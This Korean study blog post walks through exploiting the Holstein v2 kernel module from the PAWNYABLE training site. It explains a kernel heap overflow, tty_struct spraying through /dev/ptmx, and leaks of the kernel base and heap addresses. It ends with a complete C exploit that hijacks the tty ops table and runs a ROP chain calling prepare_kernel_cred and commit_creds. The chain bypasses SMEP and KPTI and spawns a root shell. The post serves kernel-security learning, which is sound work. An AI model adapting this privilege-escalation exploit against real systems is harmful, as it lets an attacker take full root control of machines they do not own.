---
title: "[KERNEL] Heap OverFlow"
description: "※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부"
date: "2024-11-14"
translation_key: "tistory-1b15a9a45937"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-Heap-OverFlow"
private: false
---

**※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다.** 

**※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다.**

**[https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)**

 [\[KERNEL\] Holstein Module

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※  Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting \[KERNEL\] Environment Setting※ 잘못된 부분이 있으면 알려주세요.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)

위 게시글에서 Holstein v1에 대해 다루었었다.

이번에는 pawnyable의 heap 취약점을 다루는 Holstein v2를 다루겠다.

[https://pawnyable.cafe/linux-kernel/index.html](https://pawnyable.cafe/linux-kernel/index.html)

 [Linux Kernel Exploitation | PAWNYABLE!

Linux Kernel Exploitation

pawnyable.cafe](https://pawnyable.cafe/linux-kernel/index.html)

* * *

우선 코드에서 수정된 부분을 살펴보면 module\_read(), module\_write()에서 값을 입력하고 쓸 때의 버퍼에서 변화가 생겼다.

```
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```

범위 검증을 수행하지 않아 취약점을 발생시키는 \_copy\_to\_user(), \_copy\_from\_user()이 아닌 안전한 함수들을 사용하고 있다.

그 외에 가장 중요시하게 봐야되는 부분은 인자로 사용되는 부분이다.

Holstein v1의 module\_read()를 잠시 살펴보면 지역 변수를 하나 생성하고, 이를 이용하는 것을 볼 수 있다.

```
static ssize_t module_read(struct file *file,
 char __user *buf, size_t count,
 loff_t *f_pos)
{
 char kbuf[BUFFER_SIZE] = { 0 };

 printk(KERN_INFO "module_read called\n");

 memcpy(kbuf, g_buf, BUFFER_SIZE);
 if (_copy_to_user(buf, kbuf, count)) {
 printk(KERN_INFO "copy_to_user failed\n");
 return -EINVAL;
 }

 return count;
}
```

바뀐 코드에서는 지역변수를 선언하기는 하지만 g\_buf 변수를 이용해서 데이터를 전달하는 것을 볼 수 있다.

```
copy_to_user(buf, g_buf, count)
```

이 g\_buf가 어디서 어떻게 선언했는지를 살펴보면 module\_open()에서 kmalloc()으로 할당하고 있는 것을 볼 수 있다.

```
static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```

kmalloc()으로 할당한 Heap 영역에 값을 입력하고 읽어오는 것이 왜 취약할까?

Kernel의 Heap 영역은 Kernel에서 사용되는 모든 드라이버와 객체들이 공유하는 영역이다.

때문에 Heap 메모리의 값을 변조하여 다른 target 객체를 파괴하거나 Exploit을 하는데 사용이 가능하다.

* * *

g\_buf의 크기는 0x400이다.

```
#define BUFFER_SIZE 0x400
```

0x400 크기와 가장 비슷한 크기의 구조체 중에는 tty\_struct가 있다.

tty\_struct는 tty.h에 정의되어 있으며 TTY에 대한 상태를 유지하기 위한 구조체이다.

```
struct tty_struct {
 int magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
 int index;
 ...
```

이 구조체가 어떤 프로세스에 의해서 실행이 되는지를 알아야 이 구조체를 사용하고, 조작하여 Exploit에 이용할 수 있다.

\[ /dev/ptmx \]와 같은 가상 터미널 등을 실행할 때 호출되는 구조체이며 Kernel에서 Heap을 할당하는 과정에서도 호출된다.

이 구조체는 각 상태에 대해 적절한 함수를 실행하고자 함수 테이블인 ops를 포함하고 있다.

```
const struct tty_operations *ops;
```

이 함수 테이블을 공격자가 설정한 임의의 테이블로 overwrite하고 이를 호출되게 한다면 Exploit이 가능해진다.

함수 테이블을 조작해야된다는 것 까지 확인했는데, 그러면 함수 테이블의 함수들 중에서 몇 번째 offset이 사용되는지를 확인해야 한다. 이를 위해 Heap Spray 기법을 사용해야 한다. 뿐만 아니라 Kaslr을 우회하기 위해서도 Heap Spray를 통해 Heap 메모리 영역의 데이터를 읽어야 한다. 

-   Heap Spray로 Kernel base와 임임의 테이블을 구성할 주소 구하기
-   Heap Spray로 함수 테이블 중 몇 번째 Offset이 사용되는지를 확인하기

먼저 memory leak을 수행할 값을 찾기 위해 main()를 다음과 같이 구성한다.

```
int main() {
 int spray[100];
 for (int i = 0; i < 50; i++) {
 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
 if (spray[i] == -1)
 fatal("/dev/ptmx");
 }

 int fd = open("/dev/holstein", O_RDWR);
 if (fd == -1)
 fatal("/dev/holstein");

 for (int i = 50; i < 100; i++) {
 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
 if (spray[i] == -1)
 fatal("/dev/ptmx");
 }

 char buf[0x500];
 memset(buf, 'A', 0x500);
 write(fd, buf, 0x500);

 getchar(); 

 close(fd);
 return 0;
}
```

\[ /dev/ptmx \]를 open하는 방식으로 tty\_struct를 포함한 메모리를 펼치게 되고 이를 User 공간으로 불려와 Debugging을 수행한다.

![](/assets/images/tistory/tistory-1b15a9a45937/001.png)

g\_buf가 사용되는 위치에 bp를 걸고 해당 주소를 분석한다.

![](/assets/images/tistory/tistory-1b15a9a45937/002.png)

유사한 형태의 구조가 계속 이어지는 것을 볼 수 있는데, 이 부분이 tty\_struct이다.

이 공간들 중 Kernel단의 주소와 fake func table 구축을 위한 Heap 주소를 가지고 있는 부분을 탐색한다.

![](/assets/images/tistory/tistory-1b15a9a45937/003.png)

0x418 위치에서 Kernel Base를 계산하기 위한 값을 찾을 수 있다.

해당 위치는 원래의 함수 테이블이 위치를 하고 있는 부분으로, 함수 테이블의 경우 커널 위에 존재하게 된다.

![](/assets/images/tistory/tistory-1b15a9a45937/004.png)

Heap 주소는 0x438에서 찾을 수 있다.

```
 char buf[0x500];
 read(fd, buf, 0x500);
 kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
 printf("[+] kbase = 0x%016lx\n", kbase);
 
 g_buf = *(unsigned long*)&buf[0x438] - 0x438;
printf("[+] g_buf = 0x%016lx\n", g_buf);
```

해당 값들을 활용하여 각 주소들을 구한다.

다음 해야하는 것은 함수 테이블 중 몇 번째 offset이 실행되는지를 봐야 하는데, 이는 0x418에 있는 값을 fake func table로 조작하고, 함수 테이블에는 0~n 까지 숫자를 커지는 주소들이 위치하게 하면 쉽게 구할 수 있다.

```
unsigned long *p = (unsigned long*)&buf;
for (int i = 0; i < 0x40; i++) {
 *p++ = 0xffffffffdead0000 + (i << 8);
}
*(unsigned long*)&buf[0x418] = g_buf;
write(fd, buf, 0x420);

for (int i = 0; i < 100; i++) {
 ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
}
```

![](/assets/images/tistory/tistory-1b15a9a45937/005.png)

offset이 0xc 인것을 확인할 수 있다.

rip 레지스터를 조작할 수 있기 때문에 SMEP를 우회할 수 있게 된다. 

Exploit은 kpti까지 우회하는 코드로 작성해주면 되는데 아래 링크에서 한번 다루었었다.

[https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

 [\[KERNEL\] KROP\_(SMEP bypass)

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 유저 영역에서 ROP는 NX-BIT 보호 기법을 우회하기 위해서 사용했었다. 커널 영역에서의 ROP 역시 SMEP라는 보호기법을

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

[https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass)

 [\[KERNEL\] KROP\_(KPTI bypass)

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※이번엔 SMEP, SMAP와 함께 KPTI 보호 기법을 우회하는 KROP를 다뤄보겠다.  #!/bin/shqemu-system-x86\_64 \\ -m 64M \\ -nographic \\ -kernel bz

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass)

전체 Exploit 코드이다.

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define addr_commit_creds (kbase + 0x0744b0)
#define addr_prepare_kernel_cred (kbase + 0x074650)
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define rop_pop_rdi (kbase + 0x0d748d)
#define rop_pop_rcx (kbase + 0x13c1c4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_bypass_kpti (kbase + 0x800e26)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  // tty_struct�췷pray
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  unsigned long *p = (unsigned long*)&buf[0x400];
  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
  *(unsigned long*)&buf[0x418] = g_buf + 0x400;

  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  write(fd, buf, 0x500);

  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); 
  }

  getchar();
  return 0;
}
```

![](/assets/images/tistory/tistory-1b15a9a45937/006.png)

성공적으로 권한 상승에 성공했다.

아래 이미지는 위 Exploit 코드를 분석하면서 정리했던 부분이다.

정확하지 않는 부분도 있겠지만 참고해서 보면 될 것 같다.

![](/assets/images/tistory/tistory-1b15a9a45937/007.png)
